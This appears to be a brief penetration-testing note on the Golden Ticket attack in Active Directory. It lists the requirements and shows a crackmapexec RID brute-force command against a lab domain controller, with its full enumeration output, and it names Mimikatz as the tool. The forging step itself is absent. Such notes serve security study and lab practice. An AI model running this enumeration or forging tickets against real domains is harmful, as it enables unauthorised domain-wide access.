# Golden Ticket (Pass the Ticket)
We can request access to any resource or system on the domain<br>
(Including all machines)
## Requirements
- KRB TGT Hash
- Domain SID
- Target RID
## Attack Overview
Obtain RID values
```
crackmapexec smb 10.129.121.92 -u 'testuser' -p 'Password123' --rid-brute
```
```
$ crackmapexec smb 10.129.121.92 -u 'testuser' -p 'Password123' --rid-brute
SMB         10.129.121.92   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:example.htb) (signing:True) (SMBv1:False)
SMB         10.129.121.92   445    DC01             [+] example.htb\testuser:Password123
SMB         10.129.121.92   445    DC01             [+] Brute forcing RIDs
SMB         10.129.121.92   445    DC01             498: EXAMPLE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.121.92   445    DC01             500: EXAMPLE\Administrator (SidTypeUser)
SMB         10.129.121.92   445    DC01             501: EXAMPLE\Guest (SidTypeUser)
SMB         10.129.121.92   445    DC01             502: EXAMPLE\krbtgt (SidTypeUser)
SMB         10.129.121.92   445    DC01             512: EXAMPLE\Domain Admins (SidTypeGroup)
SMB         10.129.121.92   445    DC01             513: EXAMPLE\Domain Users (SidTypeGroup)
SMB         10.129.121.92   445    DC01             514: EXAMPLE\Domain Guests (SidTypeGroup)
SMB         10.129.121.92   445    DC01             515: EXAMPLE\Domain Computers (SidTypeGroup)
SMB         10.129.121.92   445    DC01             516: EXAMPLE\Domain Controllers (SidTypeGroup)
SMB         10.129.121.92   445    DC01             517: EXAMPLE\Cert Publishers (SidTypeAlias)
SMB         10.129.121.92   445    DC01             518: EXAMPLE\Schema Admins (SidTypeGroup)
SMB         10.129.121.92   445    DC01             519: EXAMPLE\Enterprise Admins (SidTypeGroup)
SMB         10.129.121.92   445    DC01             520: EXAMPLE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.121.92   445    DC01             521: EXAMPLE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.121.92   445    DC01             522: EXAMPLE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.121.92   445    DC01             525: EXAMPLE\Protected Users (SidTypeGroup)
SMB         10.129.121.92   445    DC01             526: EXAMPLE\Key Admins (SidTypeGroup)
SMB         10.129.121.92   445    DC01             527: EXAMPLE\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.121.92   445    DC01             553: EXAMPLE\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.121.92   445    DC01             571: EXAMPLE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.121.92   445    DC01             572: EXAMPLE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.121.92   445    DC01             1000: EXAMPLE\DC01$ (SidTypeUser)
SMB         10.129.121.92   445    DC01             1101: EXAMPLE\DnsAdmins (SidTypeAlias)
SMB         10.129.121.92   445    DC01             1102: EXAMPLE\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.121.92   445    DC01             1103: EXAMPLE\judith.mader (SidTypeUser)
SMB         10.129.121.92   445    DC01             1104: EXAMPLE\Management (SidTypeGroup)
SMB         10.129.121.92   445    DC01             1105: EXAMPLE\management_svc (SidTypeUser)
SMB         10.129.121.92   445    DC01             1106: EXAMPLE\ca_operator (SidTypeUser)
SMB         10.129.121.92   445    DC01             1601: EXAMPLE\alexander.huges (SidTypeUser)
SMB         10.129.121.92   445    DC01             1602: EXAMPLE\harry.wilson (SidTypeUser)
SMB         10.129.121.92   445    DC01             1603: EXAMPLE\gregory.cameron (SidTypeUser)

$
```
## Tools
- Mimikatz
